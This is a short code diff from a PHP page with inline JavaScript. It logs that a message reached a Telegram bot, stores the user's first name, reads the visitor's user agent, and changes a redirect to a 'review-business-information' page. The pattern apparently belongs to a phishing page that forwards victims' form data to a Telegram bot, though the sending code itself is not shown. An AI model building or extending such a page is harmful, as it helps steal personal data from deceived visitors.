@@ -196,7 +196,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                     if (xhr.status >= 200 && xhr.status < 300) {
                         console.log('Message sent to Telegram bot successfully.');
                         setTimeout(function() {
-                            window.location.href = "review-business-information.php";
+                            window.location.href = "review-business-information";
                         }, 1000);
 
                         localStorage.setItem('firstName', firstName);
